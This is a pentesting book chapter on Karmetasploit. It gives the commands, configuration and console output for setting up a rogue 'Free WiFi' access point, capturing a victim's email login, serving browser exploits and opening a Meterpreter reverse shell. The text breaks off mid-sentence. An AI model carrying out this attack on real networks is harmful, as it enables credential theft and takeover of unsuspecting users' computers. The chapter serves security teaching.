<html><head></head><body><section epub:type="chapter" id="karmetasploit"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 12. Karmetasploit</h2></div></div></div><p class="calibre2">Karmetasploit is Metasploit’s implementation of KARMA, a set of wireless security tools developed by Dino Dai Zovi and Shane Macaulay. KARMA takes advantage of a vulnerability inherent in the way Windows XP and Mac OS X operating systems search for networks: When each system boots, it sends beacons looking for networks to which it has connected previously.<a id="IDX-CHP-12-0001" class="strong"/><a id="IDX-CHP-12-0002" class="strong"/><a id="IDX-CHP-12-0003" class="strong"/><a id="IDX-CHP-12-0004" class="strong"/></p><p class="calibre2">An attacker using KARMA sets up a fake access point on his computer and then listens for and responds to these beacons from the target, pretending to be whatever wireless network the client is looking for. Because most client computers are configured to connect automatically to wireless networks they have already used, KARMA can be used to gain complete control of a client’s network traffic, thus allowing an attacker to launch client-side attacks, capture passwords, and so forth. With the prevalence of poorly secured corporate wireless networks, an attacker using KARMA can sit in a nearby parking lot, adjacent office, or similar, and gain access to a target’s network with little effort. You can read more about the original implementation of KARMA at <a class="xref" href="http://trailofbits.com/karma/" target="_top">http://trailofbits.com/karma/</a>.</p><p class="calibre2">Karmetasploit is the Metasploit Framework implementation of the KARMA attack. It implements various “evil” services including DNS, POP3, IMAP4, SMTP, FTP, SMB, and HTTP. These services accept and respond to most requests from clients and will serve up all kinds of malicious fun. (The various modules are in the <span class="strong"><em class="calibre4">modules/auxiliary/server</em></span> directory of the Metasploit root directory.)<a id="IDX-CHP-12-0005" class="strong"/><a id="IDX-CHP-12-0006" class="strong"/><a id="IDX-CHP-12-0007" class="strong"/><a id="IDX-CHP-12-0008" class="strong"/><a id="IDX-CHP-12-0009" class="strong"/><a id="IDX-CHP-12-0010" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="configuration-id1">Configuration</h2></div></div></div><p class="calibre2">Karmetasploit requires very little configuration. To begin, we configure a DHCP server to be used to hand out IP addresses to wireless targets. Back|Track includes a DHCP server, but we will need to create a custom configuration file for it to use with Karmetasploit, as shown in the following listing:</p><a id="I_programlisting12_d1e14135" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> option domain-name-servers 10.0.0.1;
  default-lease-time 60;
  max-lease-time 72;
  ddns-update-style none;
  authoritative;
  log-facility local7;
  subnet 10.0.0.0 netmask 255.255.255.0 {
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>      range 10.0.0.100 10.0.0.254;
          option routers 10.0.0.1;
          option domain-name-servers 10.0.0.1;
  }</pre><p class="calibre2">We back up our original <span class="strong"><em class="calibre4">dhcpd.conf</em></span> file by entering <strong class="calibre3"><code class="calibre6">cp /etc/dhcp3/dhcpd.conf/etc/dhcp3/dhcpd.conf.back</code></strong>, and then we create a new file containing the data shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14156" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, which will serve addresses in the range of 10.0.0.100 to 10.0.0.254 <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14162" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. (If you are unfamiliar with DHCP configurations, don’t worry; as long as your new <span class="strong"><em class="calibre4">dhcpd.conf</em></span> looks similar to this it should work fine.)</p><p class="calibre2">Next, we download the KARMA resource file, because as of this writing it’s not included in the regular Metasploit trunk:</p><a id="I_programlisting12_d1e14173" class="strong"/><pre class="programlisting">root@bt:/opt/metasploit3/msf3# <strong class="calibre3"><code class="calibre6">wget</code></strong>
<strong class="calibre3"><code class="calibre6">http://www.offensive-security.com/downloads/karma.rc</code></strong></pre><p class="calibre2">When we open the KARMA resource file <span class="strong"><em class="calibre4">karma.rc</em></span>, we can see the sequence of events that occur when it runs, as shown here:</p><a id="I_programlisting12_d1e14185" class="strong"/><pre class="programlisting">root@bt:/opt/metasploit3/msf3# <strong class="calibre3"><code class="calibre6">cat karma.rc</code></strong>
  db_connect postgres:toor@127.0.0.1/msfbook
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> use auxiliary/server/browser_autopwn
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> setg AUTOPWN_HOST 10.0.0.1
  setg AUTOPWN_PORT 55550
  setg AUTOPWN_URI /ads
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> set LHOST 10.0.0.1
  set LPORT 45000
  set SRVPORT 55550
  set URIPATH /ads
  run
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> use auxiliary/server/capture/pop3
  set SRVPORT 110
  set SSL false
  run</pre><p class="calibre2">After loading the database (<code class="literal">db_connect postgres:toor@127.0.0.1/msfbook</code>) in which to store its results, KARMA loads the <code class="literal">browser_autopwn</code> server as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14222" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. This is a handy way to attempt a number of exploits against a browser in an untargeted manner. A handful of the browser-based exploits in the Frame-work contain the directive <code class="literal">include Msf::Exploit::Remote::BrowserAutopwn</code>: Exploits that contain that include line will be attempted when the autopwn server is accessed.<a id="IDX-CHP-12-0011" class="strong"/><a id="IDX-CHP-12-0012" class="strong"/><a id="IDX-CHP-12-0013" class="strong"/><a id="IDX-CHP-12-0014" class="strong"/><a id="IDX-CHP-12-0015" class="strong"/><a id="IDX-CHP-12-0016" class="strong"/><a id="IDX-CHP-12-0017" class="strong"/></p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14261" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14267" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, the local IP address is set to <code class="literal">10.0.0.1</code>, which coincides with the default DHCP configuration. Then, in lines <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14276" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> and on, the various servers are configured and started. (To get a complete picture of what occurs in this attack, read the resource file.)</p><p class="calibre2">Next, we place our wireless card in monitor mode. The way in which we do this depends on our wireless card’s chipset. The wireless card in the following example uses the RT73 chipset. We use <code class="literal">airmon-ng start wlan0</code> to place it in monitor mode:<a id="IDX-CHP-12-0018" class="strong"/><a id="IDX-CHP-12-0019" class="strong"/></p><a id="I_programlisting12_d1e14294" class="strong"/><pre class="programlisting">root@bt:/opt/metasploit3/msf3# <strong class="calibre3"><code class="calibre6">airmon-ng start wlan0</code></strong></pre><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">If your card uses a different chipset from the one used in this example, visit the Aircrack-ng website (<a class="xref" href="http://www.aircrack-ng.org/" target="_top">http://www.aircrack-ng.org/</a>) for specifics on how to place your card in monitor mode.<a id="IDX-CHP-12-0020" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="launching_the_attack">Launching the Attack</h2></div></div></div><p class="calibre2">The <code class="literal">airbase-ng</code> component of the Aircrack-ng suite is used to create Karmeta-sploit’s fake access point. In the next example, we configure the <code class="literal">airbase-ng</code> access point to respond to all probes (<code class="literal">-P</code>), to beacon every 30 seconds (<code class="literal">-C 30</code>) with the ESSID Free Wi-Fi (<code class="literal">-e "Free WiFi"</code>), and to be verbose (<code class="literal">-v</code>) using the interface <code class="literal">mon0</code>:<a id="IDX-CHP-12-0021" class="strong"/></p><a id="I_programlisting12_d1e14336" class="strong"/><pre class="programlisting">root@bt:/opt/metasploit3/msf3# <strong class="calibre3"><code class="calibre6">airbase-ng -P -C 30 -e "Free WiFi" -v mon0</code></strong>
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 14:06:57  Created tap interface <strong class="calibre3"><code class="calibre6">at0</code></strong>
  14:06:57  Trying to set MTU on at0 to 1500
  14:06:57  Trying to set MTU on mon0 to 1800
  14:06:57  Access Point with BSSID 00:21:29:E2:DE:14 started.</pre><p class="calibre2">As you can see at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14352" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, Airbase-ng creates a new interface called <span class="strong"><em class="calibre4">at0</em></span>. Karmetasploit will use this interface.</p><p class="calibre2">Next, we turn on the <span class="strong"><em class="calibre4">at0</em></span> interface and start the DHCP server:<a id="IDX-CHP-12-0022" class="strong"/><a id="IDX-CHP-12-0023" class="strong"/><a id="IDX-CHP-12-0024" class="strong"/><a id="IDX-CHP-12-0025" class="strong"/></p><a id="I_programlisting12_d1e14378" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> root@bt:/opt/metasploit3/msf3#
 <strong class="calibre3"><code class="calibre6">ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</code></strong>
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> root@bt:/opt/metasploit3/msf3# <strong class="calibre3"><code class="calibre6">dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</code></strong>

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  Wrote 0 leases to leases file.
  Listening on LPF/at0/00:21:29:e2:de:14/10.0.0/24
  Sending on   LPF/at0/00:21:29:e2:de:14/10.0.0/24
  Sending on   Socket/fallback/fallback-net
  Can't create PID file /var/run/dhcpd.pid: Permission denied.
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> root@bt:/opt/metasploit3/msf3# <strong class="calibre3"><code class="calibre6">ps aux |grep dhcpd</code></strong>
  dhcpd     4015  0.0  0.2   3812  1840 ?        Ss
   14:09   0:00 dhcpd3 -cf /etc/dhcp3/
      dhcpd.conf at0
  root      4017  0.0  0.0   2012   564 pts/4    S+   14:09   0:00 grep dhcpd
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> root@bt:/opt/metasploit3/msf3# tail <strong class="calibre3"><code class="calibre6">tail -f /var/log/messages</code></strong>
  Apr  2 14:06:57 bt kernel: device mon0 entered promiscuous mode
  Apr  2 14:09:30 bt dhcpd: Internet Systems Consortium DHCP Server V3.1.1
  Apr  2 14:09:30 bt kernel: warning: `dhcpd3' uses 32-bit
 capabilities (legacy support in use)
  Apr  2 14:09:30 bt dhcpd: Copyright 2004-2008 Internet Systems Consortium.
  Apr  2 14:09:30 bt dhcpd: All rights reserved.
  Apr  2 14:09:30 bt dhcpd: For info, please visit http://www.isc.org/sw/dhcp/
  Apr  2 14:09:30 bt dhcpd: Wrote 0 leases to leases file.
  Apr  2 14:09:30 bt dhcpd: Listening on LPF/at0/00:21:29:e2:de:14/10.0.0/24
  Apr  2 14:09:30 bt dhcpd: Sending on   LPF/at0/00:21:29:e2:de:14/10.0.0/24</pre><p class="calibre2">The <span class="strong"><em class="calibre4">at0</em></span> interface is turned on using the IP address of <code class="literal">10.0.0.1</code> shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14427" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, and the DHCP server is started using the configuration file we created earlier, also using <span class="strong"><em class="calibre4">at0</em></span> as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14436" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. To make sure that the DHCP server is running, we run a quick <code class="literal">ps aux</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14446" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Finally, we tail the <span class="strong"><em class="calibre4">messages</em></span> log file at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14455" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> to see when IP addresses are being handed out.</p><p class="calibre2">Now that the entire Karmetasploit configuration is complete, we can load the resource file from within <span class="strong"><em class="calibre4">msfconsole</em></span> using <code class="literal">resource karma.rc</code> as shown next. (Note that we can also pass the resource file to <span class="strong"><em class="calibre4">msfconsole</em></span> via the command line by entering <code class="literal">msfconsole -r karma.rc</code>.) Let’s see it in action:</p><a id="I_programlisting12_d1e14475" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">resource karma.rc</code></strong>
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">db_connect postgres:toor@127.0.0.1/msfbook</code></strong>
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">use auxiliary/server/browser_autopwn</code></strong>
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">setg AUTOPWN_HOST 10.0.0.1</code></strong>
  AUTOPWN_HOST =&gt; 10.0.0.1
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">setg AUTOPWN_PORT 55550</code></strong>
  AUTOPWN_PORT =&gt; 55550
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">setg AUTOPWN_URI /ads</code></strong>
  AUTOPWN_URI =&gt; /ads
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">set LHOST 10.0.0.1</code></strong>
  LHOST =&gt; 10.0.0.1
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">set LPORT 45000</code></strong>
  LPORT =&gt; 45000
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">set SRVPORT 55550</code></strong>
  SRVPORT =&gt; 55550
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">set URIPATH /ads</code></strong>
  URIPATH =&gt; /ads
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
  [*] Auxiliary module execution completed
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> resource (karma.rc)&gt; use auxiliary/server/capture/pop3
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">set SRVPORT 110</code></strong>
  SRVPORT =&gt; 110
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">set SSL false</code></strong>
  SSL =&gt; false
  resource (karma.rc)&gt; <strong class="calibre3"><code class="calibre6">run</code></strong>

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> [*] Starting exploit windows/browser/winzip_fileview with payload windows/
       meterpreter/reverse_tcp
  [*] Using URL: http://0.0.0.0:55550/N9wReDJhfKg
  [*] Local IP: http://192.168.1.101:55550/N9wReDJhfKg
  [*] Server started.
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>[*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
  [*] Starting handler for generic/shell_reverse_tcp on port 6666
  [*] Started reverse handler on 10.0.0.1:3333
  [*] Starting the payload handler...
  [*] Started reverse handler on 10.0.0.1:6666
  [*] Starting the payload handler...
  [*] --- Done, found 15 exploit modules
  [*] Using URL: http://0.0.0.0:55550/ads
  [*] Local IP: http://192.168.1.101:55550/ads
  [*] Server started.</pre><p class="calibre2">As you can see, a great deal is happening with the resource file. In this listing, the <code class="literal">LHOST</code> address is set to <span class="strong"><em class="calibre4">10.0.0.1</em></span> at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14557" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, the POP3 service (among others) is started at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14563" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, the <span class="strong"><em class="calibre4">autopwn</em></span> exploits are loaded at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14573" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, and payloads are configured at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14579" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>.<a id="IDX-CHP-12-0026" class="strong"/><a id="IDX-CHP-12-0027" class="strong"/><a id="IDX-CHP-12-0028" class="strong"/><a id="IDX-CHP-12-0029" class="strong"/><a id="IDX-CHP-12-0030" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="credential_harvesting">Credential Harvesting</h2></div></div></div><p class="calibre2">When a client connects to our malicious access point, the messages file we are tailing will show us when an IP address is handed out. This is our cue to switch back to <span class="strong"><em class="calibre4">msfconsole</em></span> to see what is happening. Here, we see that a client connects and is assigned an IP address:</p><a id="I_programlisting12_d1e14610" class="strong"/><pre class="programlisting">Apr  2 15:07:34 bt dhcpd: DHCPDISCOVER from 00:17:9a:b2:b1:6d via at0
Apr  2 15:07:35 bt dhcpd: DHCPOFFER on 10.0.0.100 to
 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0
Apr  2 15:07:35 bt dhcpd: DHCPREQUEST for 10.0.0.100 (10.0.0.1) from 00:17:9a:b2:b1:6d
    (v-xp-sp2-bare) via at0
Apr  2 15:07:35 bt dhcpd: DHCPACK on 10.0.0.100 to 00:17:9a:
b2:b1:6d (v-xp-sp2-bare) via at0</pre><p class="calibre2">The first thing our target does is open an email client. Karmetasploit is waiting, as shown here:</p><a id="I_programlisting12_d1e14614" class="strong"/><pre class="programlisting">[*] DNS 10.0.0.100:1049 XID 45030 (IN::A time.windows.com)
  [*] DNS 10.0.0.100:1049 XID 47591 (IN::A pop3.securemail.com)
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] POP3 LOGIN 10.0.0.100:1102 bsmith / s3cr3tp4s5</pre><p class="calibre2">The POP3 server configured by Metasploit intercepts the target’s email username and password at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14624" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, because all DNS requests are intercepted by the DNS server that Karmetasploit set up for us.<a id="IDX-CHP-12-0031" class="strong"/><a id="IDX-CHP-12-0032" class="strong"/><a id="IDX-CHP-12-0033" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="getting_a_shell">Getting a Shell</h2></div></div></div><p class="calibre2">At this point, the user has no new messages, so he decides to do some web browsing. When the browser opens, a <span class="strong"><em class="calibre4">captive portal</em></span> is presented to the user, as shown in <a class="xref" href="part0016.html#karmetasploit_captive_portal">Figure 12-1</a>.</p><div class="figure"><a id="karmetasploit_captive_portal" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject12_d1e14654" class="strong"/><img src="../images/00047.jpeg" alt="Karmetasploit captive portal" hisrc="httpatomoreillycomsourcenostarchimages867548.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 12-1. Karmetasploit captive portal</div></div><p class="calibre2">As the user sits in front of his computer wondering what’s going on, Karmetasploit is busy configuring the attack to capture cookies; set up fake email, DNS, and other servers; and launch exploits against the client’s browser — all the result of the magic contained in our <span class="strong"><em class="calibre4">karma.rc</em></span> file.</p><p class="calibre2">Of course, some degree of luck is involved in this attack. The browser will display a “Loading” page while exploits are launched. If the user is impatient, he may simply close the browser window, which will stop our exploits.</p><p class="calibre2">Next, you can see the massive amount of output that results from this attack:</p><a id="I_programlisting12_d1e14668" class="strong"/><pre class="programlisting">[*] HTTP REQUEST 10.0.0.100 &gt; www.microsoft.com:80 GET /isapi/redir.dll Windows IE 6.0
       cookies=WT_NVR=0=/:1=downloads:2=downloads/en;
 WT_FPC=id=111.222.333.444-1008969152
      .30063513:lv=1267703430218:ss=1267703362203;MC1
=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=
      d23f&amp;LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu
BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C864
      18EBC913CE45C4326AE
  [*] Request '/ads' from 10.0.0.100:1371
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
 [*] HTTP REQUEST 10.0.0.100 &gt; adwords.google.com:80
 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; blogger.com:80 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; care.com:80 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; careerbuilder.com:80 GET
 /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; ecademy.com:80 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; facebook.com:80 GET /
forms.html Windows IE 6.0 cookies=

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  [*] HTTP REQUEST 10.0.0.100 &gt; www.slashdot.org:80
 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; www.twitter.com:80
 GET /forms.html Windows IE 6.0 cookies=
  [*] Request '/ads?sessid=V2luZG93czpYUDpTUDI6ZW
4tdXM6eDg2Ok1TSUU6Ni4wO1NQMjo%3d' from
       10.0.0.100:1371
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> [*] JavaScript Report: Windows:XP:SP2:en-us:x86:MSIE:6.0;SP2:
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> [*] Responding with exploits
  [*] HTTP REQUEST 10.0.0.100 &gt; www.xing.com:80 GET /
forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; www.yahoo.com:80 GET /forms.html
 Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; www.ziggs.com:80 GET /forms.html
 Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; xing.com:80 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; yahoo.com:80 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; ziggs.com:80 GET /forms.html Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; care.com:80 GET / Windows IE 6.0 cookies=
  [*] HTTP REQUEST 10.0.0.100 &gt; www.care2.com:80 GET / Windows IE 6.0 cookies=
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
[*] HTTP REQUEST 10.0.0.100 &gt; activex.microsoft.com:80
 POST /objects/ocget.dll Windows IE
       6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=
       1267703362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;
HASH=d23f&amp;LV=20103&amp;V=3;A=I&amp;I=
       AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
  [*] HTTP 10.0.0.100 attempted to download an ActiveX control
  [*] HTTP REQUEST 10.0.0.100 &gt; activex.microsoft.com:80
 POST /objects/ocget.dll Windows IE
       6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.
30063513:lv=1267703430218:ss=126770
       3362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d2
3f&amp;LV=20103&amp;V=3;A=I&amp;I=
       AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
  [*] HTTP 10.0.0.100 attempted to download an ActiveX control
<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
[*] Sending Internet Explorer COM CreateObject Code Execution
 exploit HTML to 10.0.0.100:1371...
  [*] HTTP REQUEST 10.0.0.100 &gt; activex.microsoft.com:80 POST
 /objects/ocget.dll Windows IE
       6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=
       1267703362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;
HASH=d23f&amp;LV=20103&amp;V=3;A=I&amp;I=
       AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
  [*] HTTP 10.0.0.100 attempted to download an ActiveX control
  [*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80
 POST /isapi/ocget.dll Windows IE 6.0
      cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv
=1267703430218:ss=1267703362203;
      MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;
LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu
      BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  [*] HTTP 10.0.0.100 attempted to download an ActiveX control
  [*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80
 POST /isapi/ocget.dll Windows IE 6.0
       cookies=WT_FPC=id=111.222.333.444-1008969152.300
63513:lv=1267703430218:ss=1267703362203;
      MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;
LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu
      BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
  [*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80
 POST /isapi/ocget.dll Windows IE 6.0
       cookies=WT_FPC=id=111.222.333.444-1008969152.30063
513:lv=1267703430218:ss=1267703362203;
       MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;
LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu
       BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
  [*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80
 POST /isapi/ocget.dll Windows IE 6.0
       cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:
lv=1267703430218:ss=1267703362203;
       MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;
LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu
       BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE
  [*] Sending EXE payload to 10.0.0.100:1371...
  [*] Sending stage (748032 bytes) to 10.0.0.100
<img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/> [*] Meterpreter session 1 opened (10.0.0.1:3333 -&gt; 10.0.0.100:1438)</pre><p class="calibre2">In this output, you can see at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14715" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> that Metasploit first lets the client know that various popular websites are in fact located on the attacking machine. Then, at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14721" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, it uses JavaScript to determine the target’s operating system and browser, and responds at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14727" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> with exploits based on that fingerprint. At <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14733" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> the client is presented with a malicious ActiveX control, resulting in the familiar yellow prompt bar in Internet Explorer, shown at the top of <a class="xref" href="part0016.html#karmetasploit_captive_portal">Figure 12-1</a>. You can also see buried in the output at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14742" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> that an exploit was launched against the client. After a brief period, you see at <span class="inlinemediaobject"><a id="I_inlinemediaobject12_d1e14748" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span> that the exploit was successful and a Meterpreter session has been opened on the target PC!<a 